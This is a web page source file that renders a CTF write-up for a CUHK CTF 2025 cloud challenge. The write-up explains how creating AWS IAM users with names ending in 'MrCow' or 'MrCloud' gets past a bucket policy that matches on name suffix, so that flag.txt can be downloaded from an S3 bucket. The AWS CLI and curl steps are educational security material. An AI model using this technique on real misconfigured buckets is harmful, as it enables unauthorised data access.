import Tag from "@/components/Common/Tag";
import { mdxComponents } from "@/components/ui/mdxComponents";
import { createFileRoute } from "@tanstack/react-router";
import Markdown from "react-markdown";
import rehypeRaw from "rehype-raw";

const title = "# [cloud] Iam Mr. Cow or Mr. Cloud?";
const stars = "★★★★"
const author = "Mr.Cow";
const points = 498;
const solves = 9;
const category = "Cloud Security";
const competition = "CUHK CTF 2025";

const data = `
Out on the edge of the pasture, a ladder climbs into the sky. At the top sits a quiet vault of silver—guarded by two peculiar doormen:

Mr. Cow, who lets you peek inside but never touch.

Mr. Cloud, who lets you take exactly one thing—if he believes who you are.

A tiny storefront page is all you’re given. It looks harmless, but it reflects the sky and whispers just enough about the rules above. In this realm, names matter more than keys. Those who shape their identity with care will earn a glance… and, with the right guise, the right to claim the treasure.

---


## Hints:
1. PS: You’ll want your own AWS playground for this—signing up for a free account (no charges for basic CLI calls) is enough. Once you’re there, remember that aws s3api get-bucket-policy is often the first polite knock on a guarded door.

2. The vault responds to IAM principals whose ARN names end in MrCow or MrCloud; tailor your profile suffix and each guardian reveals their part.

---

# Observations:

When downloading the zip, we are greeted with a index.html file. Opening it in a browser, shows a simple webpage with an SVG image.


![image](/assets/images/blog/cuhk25ctf/iam_mr_cow_or_mr_cloud/cowcloud.svg)

[index.html](/assets/images/blog/cuhk25ctf/iam_mr_cow_or_mr_cloud/index.html)

Aside from that, the title of this challenge starts with IAM, which is a service in AWS for Identity and Access Management. This hints that we might be dealing with access permissions.

---

# Solution:

## Step 1: Inspection

The SVG image has s3://assets/ written on it. This should be referring to the S3 bucket of AWS.

Inspecting the page source, we see that the <img> tag has a src attribute with the value of <img src=[https://mr-cow-or-mr-cloud-secret-20250916-a1.s3.us-east-1.amazonaws.com/assets/cowcloud.svg](https://mr-cow-or-mr-cloud-secret-20250916-a1.s3.us-east-1.amazonaws.com/assets/cowcloud.svg) />.

The URL is pointing to an S3 bucket named mr-cow-or-mr-cloud-secret-20250916-a1 in the us-east-1 region.

## Step 2: Accessing the S3 Bucket

We can first attempt to publicly access this file:

\`\`\`
curl "https://mr-cow-or-mr-cloud-secret-20250916-a1.s3.us-east-1.amazonaws.com/assets/cowcloud.svg"
\`\`\`

From the results, we can see we can publicly access it.

\`\`\`
<?xml version="1.0" encoding="UTF-8"?>
<svg width="640" height="360" viewBox="0 0 640 360" xmlns="http://www.w3.org/2000/svg">
  <defs>
    ... (etc) ... 
\`\`\`

We now try accessing other files such as flag.txt:
\`\`\`
curl "https://mr-cow-or-mr-cloud-secret-20250916-a1.s3.us-east-1.amazonaws.com/flag.txt"
\`\`\`

We get an Access Denied error. Rip :(
\`\`\`
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>N94ZHM5K3BDNM09Q</RequestId><HostId>93pEPa99upHuWWYa6sTij+oR/z0Lwq1DDnCyWyKTnKwshx1g+6TyjuN8nPi9V31h8g9UNqWYG8o=</HostId></Error>
\`\`\`

This means other files require permissions to access.

## Step 3: Understanding the Bucket Policy
Since the hints suggest we need an IAM profile of our own, we can make an account on AWS and create two profiles with the suffix of MrCow or MrCloud.

Any IAM profile name is fine, as long as it ends with MrCow and MrCloud respectively.

For my case, I used TestMrCow and TestMrCloud.


\`\`\`sh
# Configure TestMrCow profile
aws configure set aws_access_key_id <redacted> --profile TestMrCow
aws configure set aws_secret_access_key <redacted> --profile TestMrCow
aws configure set region us-east-1 --profile TestMrCow

# Configure TestMrCloud profile
aws configure set aws_access_key_id <redacted> --profile TestMrCloud
aws configure set aws_secret_access_key <redacted> --profile TestMrCloud
aws configure set region us-east-1 --profile TestMrCloud
\`\`\`

To confirm that we are signed in:

\`\`\`sh
aws sts get-caller-identity --profile TestMrCow
aws sts get-caller-identity --profile TestMrCloud
\`\`\`

\`\`\`
{
    "UserId": "AIDATJS2C3YDDIAQO4SOC",
    "Account": "226748456454",
    "Arn": "arn:aws:iam::226748456454:user/TestMrCow"     
}
{
    "UserId": "AIDATJS2C3YDJJ6L2GSSN",
    "Account": "226748456454",
    "Arn": "arn:aws:iam::226748456454:user/TestMrCloud"   
}
\`\`\`

Now, let's test the access permissions of both profiles.

\`\`\`sh
aws s3 ls s3://mr-cow-or-mr-cloud-secret-20250916-a1/ --profile TestMrCow
\`\`\`
\`\`\`
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
\`\`\`

We get Access Denied.

Now, let's try the other profile.

\`\`\`sh
aws s3 ls s3://mr-cow-or-mr-cloud-secret-20250916-a1/ --profile TestMrCloud
\`\`\`
\`\`\`
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
\`\`\`

We also get Access Denied.

The hint said we should try to get the bucket policy to understand the access rules.

\`\`\`sh
aws s3api get-bucket-policy --bucket mr-cow-or-mr-cloud-secret-20250916-a1 --profile TestMrCow
aws s3api get-bucket-policy --bucket mr-cow-or-mr-cloud-secret-20250916-a1 --profile TestMrCloud
\`\`\`

\`\`\`
An error occurred (AccessDenied) when calling the GetBucketPolicy operation: Access Denied
An error occurred (MethodNotAllowed) when calling the GetBucketPolicy operation: The specified method is not allowed against this resource.
\`\`\`

Weird! For the TestMrCow profile, we get Access Denied, but for the TestMrCloud profile, we get MethodNotAllowed.

This means that the bucket policy is denying access to TestMrCow, but allowing TestMrCloud to access it.

Let's try to access the objects directly instead of listing them.

\`\`\`sh
aws s3 cp s3://mr-cow-or-mr-cloud-secret-20250916-a1/flag.txt ./flag.txt --profile TestMrCow
aws s3 cp s3://mr-cow-or-mr-cloud-secret-20250916-a1/flag.txt ./flag.txt --profile TestMrCloud
\`\`\`

\`\`\`
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
Completed 42 Bytes/42 Bytes (43 Bytes/s) with 1 file(s) redownload: s3://mr-cow-or-mr-cloud-secret-20250916-a1/flag.txt to ./flag.txt
\`\`\`

Oh! We managed to download the flag.txt file!

\`\`\`
cuhk25ctf{m00n_m45k5_h1d3_th3_cl0ud_g4t3s}
\`\`\`

*Fun fact, this challenge is solvable by using Github Copilot Agent Mode XD*
`

export const Route = createFileRoute("/blog/ctf/cuhk25ctf/iam_mr_cow_or_mr_cloud")({
  component: iam_mr_cow_or_mr_cloud,
})

function iam_mr_cow_or_mr_cloud() {
  return (
    <div className="w-full mx-auto my-8 px-4 flex justify-center">
      <div className="w-full sm:w-[70%] md:w-[50%]">
        <Markdown components={mdxComponents}>{title}</Markdown>
        <div className="text-gray-0 my-4">
          <p>Author: {author}</p>
          <p>{stars}</p>
          <p>{points} Points | {solves} Solves</p>
        </div>
        <div className="flex gap-2 my-4">
          <Tag>{category}</Tag>
          <Tag>{competition}</Tag>
        </div>
        <Markdown rehypePlugins={[rehypeRaw]} components={mdxComponents}>{data}</Markdown>
      </div>
    </div>
  )
}
